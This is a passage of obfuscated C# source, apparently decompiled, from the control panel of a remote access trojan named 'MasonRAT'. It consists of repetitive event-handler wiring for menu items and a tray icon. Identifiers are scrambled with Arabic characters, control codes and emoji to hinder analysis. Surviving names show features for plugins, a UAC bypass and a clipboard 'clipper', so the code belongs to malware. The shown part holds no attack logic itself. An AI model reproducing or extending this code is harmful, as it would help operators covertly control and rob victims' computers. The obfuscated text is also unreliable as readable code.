      this.\u2694️MasonRAT\u270Cـد\u060Aـــــڙـ\u060Aٺٸئ = value;
      ToolStripMenuItem masonRatـدـــــڙـٺٸئ2 = this.\u2694️MasonRAT\u270Cـد\u060Aـــــڙـ\u060Aٺٸئ;
      if (masonRatـدـــــڙـٺٸئ2 == null)
        return;
      masonRatـدـــــڙـٺٸئ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("PluginsToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060A\u0609\u060Bﻻـدــټـ\u060Fـــْ\u060E\u060Dڙاټ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۙـڕـ\u060Dـ\u0609\u060F\u0609ــد
  {
    get => this.\u2694️MasonRAT\u270C\u0609ـﻋ\u060Cۛٺة\u060D\u060B\u060Cۏڞـــ\u060Aـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـּبﻻۭٺحټ\u060Dـۡ\u0608ڕـ\u0609ٸـ\u0609ٻ\u0020);
      ToolStripMenuItem masonRatـﻋۛٺةۏڞــــ1 = this.\u2694️MasonRAT\u270C\u0609ـﻋ\u060Cۛٺة\u060D\u060B\u060Cۏڞـــ\u060Aـ;
      if (masonRatـﻋۛٺةۏڞــــ1 != null)
        masonRatـﻋۛٺةۏڞــــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0609ـﻋ\u060Cۛٺة\u060D\u060B\u060Cۏڞـــ\u060Aـ = value;
      ToolStripMenuItem masonRatـﻋۛٺةۏڞــــ2 = this.\u2694️MasonRAT\u270C\u0609ـﻋ\u060Cۛٺة\u060D\u060B\u060Cۏڞـــ\u060Aـ;
      if (masonRatـﻋۛٺةۏڞــــ2 == null)
        return;
      masonRatـﻋۛٺةۏڞــــ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("UACBypassToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۡـڙڼْۧـ\u0608ـ\u060Dـ\u0608̍\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader7")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cـبٸـ\u060Aﻻ\u0608ٻحڞ\u0608\u060B\u060A\u0609ۧ\u060E { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader8")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cـ\u060B\u060Dٸ\u060C\u060Dۜڞۨ\u060Dـ\u0608ٸ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader9")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cــ\u0609ڝح\u060Aڙۛۏ\u060Dـۨـۚ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader10")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cـۡ̍\u0608\u0608ـ̍ٻژۏـۧﻋﮪ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual NotifyIcon \u2694️MasonRAT\u270C\u060Dﻻٺدئـڕٺڞ\u060Bٸ̍ﮪ\u0609
  {
    get => this.\u2694️MasonRAT\u270C\u0608مـﻻ\u060D\u060Eڦگۧاڜـڣ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cـﻋ\u0609ـ\u060Dـؤ\u060D\u0609ـ\u060Eژڙ؁̍\u060Aؤ\u060Bـ\u0609);
      NotifyIcon masonRatمـﻻڦگۧاڜـڣ1 = this.\u2694️MasonRAT\u270C\u0608مـﻻ\u060D\u060Eڦگۧاڜـڣ\u060A;
      if (masonRatمـﻻڦگۧاڜـڣ1 != null)
        masonRatمـﻻڦگۧاڜـڣ1.MouseDoubleClick -= mouseEventHandler;
      this.\u2694️MasonRAT\u270C\u0608مـﻻ\u060D\u060Eڦگۧاڜـڣ\u060A = value;
      NotifyIcon masonRatمـﻻڦگۧاڜـڣ2 = this.\u2694️MasonRAT\u270C\u0608مـﻻ\u060D\u060Eڦگۧاڜـڣ\u060A;
      if (masonRatمـﻻڦگۧاڜـڣ2 == null)
        return;
      masonRatمـﻻڦگۧاڜـڣ2.MouseDoubleClick += mouseEventHandler;
    }
  }

  [field: AccessedThroughProperty("ContextMenuStrip2")]
  internal virtual ContextMenuStrip \u2694️MasonRAT\u270Cۧڙ\u0608دٻۡـٺ\u0608\u0609ۙ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــ\u0608ـىﮪ\u060Dۡ\u0609ـڇ\u0020ئـ
  {
    get => this.\u2694️MasonRAT\u270Cۙ\u060Bـ\u060B\u060Dڼـٸــ\u060A\u060Aــۛ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Cـۡــى\u060Aم\u060Aــْ̨\u060Aـ);
      ToolStripMenuItem masonRatۙـڼـٸــــۛ1 = this.\u2694️MasonRAT\u270Cۙ\u060Bـ\u060B\u060Dڼـٸــ\u060A\u060Aــۛ;
      if (masonRatۙـڼـٸــــۛ1 != null)
        masonRatۙـڼـٸــــۛ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۙ\u060Bـ\u060B\u060Dڼـٸــ\u060A\u060Aــۛ = value;
      ToolStripMenuItem masonRatۙـڼـٸــــۛ2 = this.\u2694️MasonRAT\u270Cۙ\u060Bـ\u060B\u060Dڼـٸــ\u060A\u060Aــۛ;
      if (masonRatۙـڼـٸــــۛ2 == null)
        return;
      masonRatۙـڼـٸــــۛ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڙ\u0609ـڝټـڙـــ\u0608ڙـ\u060C\u0608ټ\u060Fـ\u0608
  {
    get => this.\u2694️MasonRAT\u270C\u060D\u060Eڦ\u060D\u060C\u060Dۜدڟ̍گءـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608\u060Cۛ\u060Cڠگءڙطۡـ\u060D\u0608ڙـۙ\u0608د);
      ToolStripMenuItem masonRatڦۜدڟ̍گءـ1 = this.\u2694️MasonRAT\u270C\u060D\u060Eڦ\u060D\u060C\u060Dۜدڟ̍گءـ;
      if (masonRatڦۜدڟ̍گءـ1 != null)
        masonRatڦۜدڟ̍گءـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060D\u060Eڦ\u060D\u060C\u060Dۜدڟ̍گءـ = value;
      ToolStripMenuItem masonRatڦۜدڟ̍گءـ2 = this.\u2694️MasonRAT\u270C\u060D\u060Eڦ\u060D\u060C\u060Dۜدڟ̍گءـ;
      if (masonRatڦۜدڟ̍گءـ2 == null)
        return;
      masonRatڦۜدڟ̍گءـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــــ\u060Cۧٺ\u060Eﯧ\u060F\u060Aۙـ
  {
    get => this.\u2694️MasonRAT\u270C̍ڟ\u0608ـبۨٸټ̨ۭـڙـ\u060Eڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﮪـ\u060A\u060Dٺ؁\u0609\u060Bٻ\u060Bـ\u0608ۭـڛ);
      ToolStripMenuItem rat̍ڟـبۨٸټ̨ۭـڙـڙ1 = this.\u2694️MasonRAT\u270C̍ڟ\u0608ـبۨٸټ̨ۭـڙـ\u060Eڙ;
      if (rat̍ڟـبۨٸټ̨ۭـڙـڙ1 != null)
        rat̍ڟـبۨٸټ̨ۭـڙـڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C̍ڟ\u0608ـبۨٸټ̨ۭـڙـ\u060Eڙ = value;
      ToolStripMenuItem rat̍ڟـبۨٸټ̨ۭـڙـڙ2 = this.\u2694️MasonRAT\u270C̍ڟ\u0608ـبۨٸټ̨ۭـڙـ\u060Eڙ;
      if (rat̍ڟـبۨٸټ̨ۭـڙـڙ2 == null)
        return;
      rat̍ڟـبۨٸټ̨ۭـڙـڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۛ\u0608ٽـۧ\u060Aﻋۡـڙٻ\u060D\u0609ڙ\u060Fـۡـــ
  {
    get => this.\u2694️MasonRAT\u270Cؤـ\u0609\u0609ٺ\u060Dـٺـؤــڙ\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0608\u060C\u060Bٽۏـ\u060A\u0609ـ̨ـ);
      ToolStripMenuItem masonRatؤـٺـٺـؤــڙ1 = this.\u2694️MasonRAT\u270Cؤـ\u0609\u0609ٺ\u060Dـٺـؤــڙ\u0608;
      if (masonRatؤـٺـٺـؤــڙ1 != null)
        masonRatؤـٺـٺـؤــڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cؤـ\u0609\u0609ٺ\u060Dـٺـؤــڙ\u0608 = value;
      ToolStripMenuItem masonRatؤـٺـٺـؤــڙ2 = this.\u2694️MasonRAT\u270Cؤـ\u0609\u0609ٺ\u060Dـٺـؤــڙ\u0608;
      if (masonRatؤـٺـٺـؤــڙ2 == null)
        return;
      masonRatؤـٺـٺـؤــڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـۡ\u060F\u060Aــ\u060A\u060Aـڣڼـ
  {
    get => this.\u2694️MasonRAT\u270Cۙ\u060F\u060Dڜٽ\u060C\u060B\u0608ڙحــۨۡ\u060D\u060Eڛ̍ٽ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Eﯧـ\u0609ـ\u060Cڅٻ\u060Dـڙ\u0608ـﻻڙ\u060Dـۏ̍ـ);
      ToolStripMenuItem masonRatۙڜٽڙحــۨۡڛ̍ٽ1 = this.\u2694️MasonRAT\u270Cۙ\u060F\u060Dڜٽ\u060C\u060B\u0608ڙحــۨۡ\u060D\u060Eڛ̍ٽ\u060A;
      if (masonRatۙڜٽڙحــۨۡڛ̍ٽ1 != null)
        masonRatۙڜٽڙحــۨۡڛ̍ٽ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۙ\u060F\u060Dڜٽ\u060C\u060B\u0608ڙحــۨۡ\u060D\u060Eڛ̍ٽ\u060A = value;
      ToolStripMenuItem masonRatۙڜٽڙحــۨۡڛ̍ٽ2 = this.\u2694️MasonRAT\u270Cۙ\u060F\u060Dڜٽ\u060C\u060B\u0608ڙحــۨۡ\u060D\u060Eڛ̍ٽ\u060A;
      if (masonRatۙڜٽڙحــۨۡڛ̍ٽ2 == null)
        return;
      masonRatۙڜٽڙحــۨۡڛ̍ٽ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060E\u060Bــּٺٺٸحـ\u060A\u060Dـ\u060A\u0609
  {
    get => this.\u2694️MasonRAT\u270C̨\u0608ـ\u0608ڙٺٽ\u060B\u060Fڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Fۜٻ\u060Dـټڝژڛـڙ\u060Aڙڣ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C̨\u0608ـ\u0608ڙٺٽ\u060B\u060Fڙ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C̨\u0608ـ\u0608ڙٺٽ\u060B\u060Fڙ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C̨\u0608ـ\u0608ڙٺٽ\u060B\u060Fڙ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڅد\u060Aد̨ٻﻻ\u0609\u060Dڙــــۡـــ\u060B\u060F
  {
    get => this.\u2694️MasonRAT\u270C̍\u0020\u0609ڙٸـىْــ̨ـــ\u060Bۡڦ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٽٺ\u060D\u060Dڅــ̨ټڠـ\u060Fـ\u060Aۛـۛۜ);
      ToolStripMenuItem rat̍ڙٸـىْــ̨ـــۡڦ1 = this.\u2694️MasonRAT\u270C̍\u0020\u0609ڙٸـىْــ̨ـــ\u060Bۡڦ;
      if (rat̍ڙٸـىْــ̨ـــۡڦ1 != null)
        rat̍ڙٸـىْــ̨ـــۡڦ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C̍\u0020\u0609ڙٸـىْــ̨ـــ\u060Bۡڦ = value;
      ToolStripMenuItem rat̍ڙٸـىْــ̨ـــۡڦ2 = this.\u2694️MasonRAT\u270C̍\u0020\u0609ڙٸـىْــ̨ـــ\u060Bۡڦ;
      if (rat̍ڙٸـىْــ̨ـــۡڦ2 == null)
        return;
      rat̍ڙٸـىْــ̨ـــۡڦ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Dــــة\u060E\u0608ـ\u0609ٺ\u060A\u0609\u0608ڛـاۏٺ
  {
    get => this.\u2694️MasonRAT\u270Cڙ\u060Aټٺ\u060A\u0609\u060C\u060Dـ\u060Aڕـؤ\u0608ـۙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cﻻ\u060Fٽـڜـ̍ۧـڙٺدڙـּى);
      ToolStripMenuItem masonRatڙټٺـڕـؤـۙ1 = this.\u2694️MasonRAT\u270Cڙ\u060Aټٺ\u060A\u0609\u060C\u060Dـ\u060Aڕـؤ\u0608ـۙ;
      if (masonRatڙټٺـڕـؤـۙ1 != null)
        masonRatڙټٺـڕـؤـۙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙ\u060Aټٺ\u060A\u0609\u060C\u060Dـ\u060Aڕـؤ\u0608ـۙ = value;
      ToolStripMenuItem masonRatڙټٺـڕـؤـۙ2 = this.\u2694️MasonRAT\u270Cڙ\u060Aټٺ\u060A\u0609\u060C\u060Dـ\u060Aڕـؤ\u0608ـۙ;
      if (masonRatڙټٺـڕـؤـۙ2 == null)
        return;
      masonRatڙټٺـڕـؤـۙ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ClipperToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڦــۨــڛـڙ\u060Aٻـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙـﻋ\u060Dـْـ\u060Aٸ\u060D
  {
    get => this.\u2694️MasonRAT\u270Cح\u060Bٺـ\u060Aۜۡۡـم\u0608\u0020ڇٸ\u0609ــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dــدــٺــ\u0608ۡـى\u060Bﮪڇــ);
      ToolStripMenuItem masonRatحٺـۜۡۡـمڇٸــ1 = this.\u2694️MasonRAT\u270Cح\u060Bٺـ\u060Aۜۡۡـم\u0608\u0020ڇٸ\u0609ــ;
      if (masonRatحٺـۜۡۡـمڇٸــ1 != null)
        masonRatحٺـۜۡۡـمڇٸــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cح\u060Bٺـ\u060Aۜۡۡـم\u0608\u0020ڇٸ\u0609ــ = value;
      ToolStripMenuItem masonRatحٺـۜۡۡـمڇٸــ2 = this.\u2694️MasonRAT\u270Cح\u060Bٺـ\u060Aۜۡۡـم\u0608\u0020ڇٸ\u0609ــ;
      if (masonRatحٺـۜۡۡـمڇٸــ2 == null)
        return;
      masonRatحٺـۜۡۡـمڇٸــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608ـــ\u060C\u060Dۙ\u060A\u0608\u060D\u060Aٻؤ\u060A
  {
    get => this.\u2694️MasonRAT\u270Cـ\u0609ﻋڛ\u0609ـ\u060A\u0609\u0608ٺ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aـدۚۧ\u0608دب\u060Aڼ\u0608ۚئـ\u0609);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cـ\u0609ﻋڛ\u0609ـ\u060A\u0609\u0608ٺ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـ\u0609ﻋڛ\u0609ـ\u060A\u0609\u0608ٺ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cـ\u0609ﻋڛ\u0609ـ\u060A\u0609\u0608ٺ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Aۭۧ\u060B\u0609ڙۧ\u060A\u060Dڙ\u0020\u0020\u060Dـةـحـ\u060D
  {
    get => this.\u2694️MasonRAT\u270Cـڙ\u0608ٸ\u060Dڙـ\u060Bۙڙم\u060F̍ټـــ\u060E;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٻۙاــﻋـ\u0608̍\u060Dڙ\u060F\u060Aــۛدڞ);
      ToolStripMenuItem ratـڙٸڙـۙڙم̍ټـــ1 = this.\u2694️MasonRAT\u270Cـڙ\u0608ٸ\u060Dڙـ\u060Bۙڙم\u060F̍ټـــ\u060E;
      if (ratـڙٸڙـۙڙم̍ټـــ1 != null)
        ratـڙٸڙـۙڙم̍ټـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙ\u0608ٸ\u060Dڙـ\u060Bۙڙم\u060F̍ټـــ\u060E = value;
      ToolStripMenuItem ratـڙٸڙـۙڙم̍ټـــ2 = this.\u2694️MasonRAT\u270Cـڙ\u0608ٸ\u060Dڙـ\u060Bۙڙم\u060F̍ټـــ\u060E;
      if (ratـڙٸڙـۙڙم̍ټـــ2 == null)
        return;
      ratـڙٸڙـۙڙم̍ټـــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608ڙ\u0608ـڦڙ\u060A̍\u0020ڙڇ\u0608ٻۭ
  {
    get
    {
      return this.\u2694️MasonRAT\u270Cـط\u0608\u060Aـةٽڦـ\u060Dۜ\u060Dڠ\u060C\u060A\u0608ـ\u060D\u060C;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cڙ\u0609ڙ\u060Fۙـٸ\u0609\u0608ــ\u060F\u060Aڕـ\u060Aگـ);
      ToolStripMenuItem masonRatـطـةٽڦـۜڠـ1 = this.\u2694️MasonRAT\u270Cـط\u0608\u060Aـةٽڦـ\u060Dۜ\u060Dڠ\u060C\u060A\u0608ـ\u060D\u060C;
      if (masonRatـطـةٽڦـۜڠـ1 != null)
        masonRatـطـةٽڦـۜڠـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـط\u0608\u060Aـةٽڦـ\u060Dۜ\u060Dڠ\u060C\u060A\u0608ـ\u060D\u060C = value;
      ToolStripMenuItem masonRatـطـةٽڦـۜڠـ2 = this.\u2694️MasonRAT\u270Cـط\u0608\u060Aـةٽڦـ\u060Dۜ\u060Dڠ\u060C\u060A\u0608ـ\u060D\u060C;
      if (masonRatـطـةٽڦـۜڠـ2 == null)
        return;
      masonRatـطـةٽڦـۜڠـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڙـدـﮪگــ\u0608ڦ\u060Bـ̍
  {
    get => this.\u2694️MasonRAT\u270C\u060Dۧ\u060Dۛ\u060Eٻ\u060Bؤـۙـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Dـ\u060Cژــ\u060Bۛﻋۚ\u0609ڣـ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u060Dۧ\u060Dۛ\u060Eٻ\u060Bؤـۙـ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Dۧ\u060Dۛ\u060Eٻ\u060Bؤـۙـ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u060Dۧ\u060Dۛ\u060Eٻ\u060Bؤـۙـ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـْــۏۛ\u0609ۚڙ\u0020̍ۛ
  {
    get
    {
      return this.\u2694️MasonRAT\u270Cد\u060D\u060A\u0608ڦ\u0608اڙ\u060Bـطּ\u0608\u0608\u060A\u0608ــ;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0020ۡـ\u060E\u060D\u060E\u060D\u060Dۡــڦﻻ\u0609);
      ToolStripMenuItem masonRatدڦاڙـطּــ1 = this.\u2694️MasonRAT\u270Cد\u060D\u060A\u0608ڦ\u0608اڙ\u060Bـطּ\u0608\u0608\u060A\u0608ــ;
      if (masonRatدڦاڙـطּــ1 != null)
        masonRatدڦاڙـطּــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cد\u060D\u060A\u0608ڦ\u0608اڙ\u060Bـطּ\u0608\u0608\u060A\u0608ــ = value;
      ToolStripMenuItem masonRatدڦاڙـطּــ2 = this.\u2694️MasonRAT\u270Cد\u060D\u060A\u0608ڦ\u0608اڙ\u060Bـطּ\u0608\u0608\u060A\u0608ــ;
      if (masonRatدڦاڙـطּــ2 == null)
        return;
      masonRatدڦاڙـطּــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Aۙژةټئ\u0608ـ\u060Fـ\u060Eٻاٺـ\u060B\u0609\u060Fـ
  {
    get => this.\u2694️MasonRAT\u270Cڝڇٺـ\u060Dـڠدڙۨڼـ\u060Aڙ̍\u060Fڙـ\u060C;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٻـﻻ\u060Aـ\u060D\u0609\u0609ـڇ\u060Eـ̍ۡ);
      ToolStripMenuItem ratڝڇٺــڠدڙۨڼـڙ̍ڙـ1 = this.\u2694️MasonRAT\u270Cڝڇٺـ\u060Dـڠدڙۨڼـ\u060Aڙ̍\u060Fڙـ\u060C;
      if (ratڝڇٺــڠدڙۨڼـڙ̍ڙـ1 != null)
        ratڝڇٺــڠدڙۨڼـڙ̍ڙـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڝڇٺـ\u060Dـڠدڙۨڼـ\u060Aڙ̍\u060Fڙـ\u060C = value;
      ToolStripMenuItem ratڝڇٺــڠدڙۨڼـڙ̍ڙـ2 = this.\u2694️MasonRAT\u270Cڝڇٺـ\u060Dـڠدڙۨڼـ\u060Aڙ̍\u060Fڙـ\u060C;
      if (ratڝڇٺــڠدڙۨڼـڙ̍ڙـ2 == null)
        return;
      ratڝڇٺــڠدڙۨڼـڙ̍ڙـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cد\u060Aـڙط\u0608حڞـٽ\u0609ـماـ
  {
    get => this.\u2694️MasonRAT\u270Cڣ\u060D̍ڙـټۚۏ\u060Aؤ\u060B\u0608̨̍\u060Bڣ\u060Cـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cا\u060A\u060Cۛ\u060Aدط\u0609بـۡﻋ\u060Aـ\u060A);
      ToolStripMenuItem masonRatڣ̍ڙـټۚۏؤ̨̍ڣـ1 = this.\u2694️MasonRAT\u270Cڣ\u060D̍ڙـټۚۏ\u060Aؤ\u060B\u0608̨̍\u060Bڣ\u060Cـ;
      if (masonRatڣ̍ڙـټۚۏؤ̨̍ڣـ1 != null)
        masonRatڣ̍ڙـټۚۏؤ̨̍ڣـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڣ\u060D̍ڙـټۚۏ\u060Aؤ\u060B\u0608̨̍\u060Bڣ\u060Cـ = value;
      ToolStripMenuItem masonRatڣ̍ڙـټۚۏؤ̨̍ڣـ2 = this.\u2694️MasonRAT\u270Cڣ\u060D̍ڙـټۚۏ\u060Aؤ\u060B\u0608̨̍\u060Bڣ\u060Cـ;
      if (masonRatڣ̍ڙـټۚۏؤ̨̍ڣـ2 == null)
        return;
      masonRatڣ̍ڙـټۚۏؤ̨̍ڣـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـۭ\u060A\u060Dـدـ\u060D\u060Dﻼټ\u060A\u060Fۚ\u060Dـٸ
  {
    get => this.\u2694️MasonRAT\u270Cﻋ\u0609ـۧڼڅٸـۙــ\u0608ڞة\u060Eـ\u060Bــ\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cټﻼـ؁ء̍ـ\u0608م\u060Fـڙا\u060A\u0020ٻ);
      ToolStripMenuItem ratﻋـۧڼڅٸـۙــڞةـــ1 = this.\u2694️MasonRAT\u270Cﻋ\u0609ـۧڼڅٸـۙــ\u0608ڞة\u060Eـ\u060Bــ\u0608;
      if (ratﻋـۧڼڅٸـۙــڞةـــ1 != null)
        ratﻋـۧڼڅٸـۙــڞةـــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﻋ\u0609ـۧڼڅٸـۙــ\u0608ڞة\u060Eـ\u060Bــ\u0608 = value;
      ToolStripMenuItem ratﻋـۧڼڅٸـۙــڞةـــ2 = this.\u2694️MasonRAT\u270Cﻋ\u0609ـۧڼڅٸـۙــ\u0608ڞة\u060Eـ\u060Bــ\u0608;
      if (ratﻋـۧڼڅٸـۙــڞةـــ2 == null)
        return;
      ratﻋـۧڼڅٸـۙــڞةـــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـڙ\u0608̍\u0608ۛحب\u060Aٺــ\u060D
  {
    get => this.\u2694️MasonRAT\u270C\u060Bـڕ\u0608ﯧـ\u0608ـڙڣ\u060Dۡح;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608\u0608ـﯧ\u060Bٺ\u060A\u060A\u060Bمٺـڕ);
      ToolStripMenuItem masonRatـڕﯧــڙڣۡح1 = this.\u2694️MasonRAT\u270C\u060Bـڕ\u0608ﯧـ\u0608ـڙڣ\u060Dۡح;
      if (masonRatـڕﯧــڙڣۡح1 != null)
        masonRatـڕﯧــڙڣۡح1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Bـڕ\u0608ﯧـ\u0608ـڙڣ\u060Dۡح = value;
      ToolStripMenuItem masonRatـڕﯧــڙڣۡح2 = this.\u2694️MasonRAT\u270C\u060Bـڕ\u0608ﯧـ\u0608ـڙڣ\u060Dۡح;
      if (masonRatـڕﯧــڙڣۡح2 == null)
        return;
      masonRatـڕﯧــڙڣۡح2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0609\u0608ٺد\u0609ﻻۡؤۡ\u0020ـ\u0609\u060Aۭڙ\u0608ـح\u060Dـ
  {
    get => this.\u2694️MasonRAT\u270Cبڙـڙـءـــــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cح\u060Aـ\u060A\u0020اـٸ\u060Cْٸـ\u060Bؤ\u060Cـ\u060B\u0608);
      ToolStripMenuItem masonRatبڙـڙـءـــــ1 = this.\u2694️MasonRAT\u270Cبڙـڙـءـــــ;
      if (masonRatبڙـڙـءـــــ1 != null)
        masonRatبڙـڙـءـــــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cبڙـڙـءـــــ = value;
      ToolStripMenuItem masonRatبڙـڙـءـــــ2 = this.\u2694️MasonRAT\u270Cبڙـڙـءـــــ;
      if (masonRatبڙـڙـءـــــ2 == null)
        return;
      masonRatبڙـڙـءـــــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــۏبـ\u060A\u060D\u060Dۡڙــټ\u060A
  {
    get => this.\u2694️MasonRAT\u270Cــ\u060Dټۨ\u060Aــ̍ـۭۭ\u0608\u060D\u0609\u0609؁\u0609;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
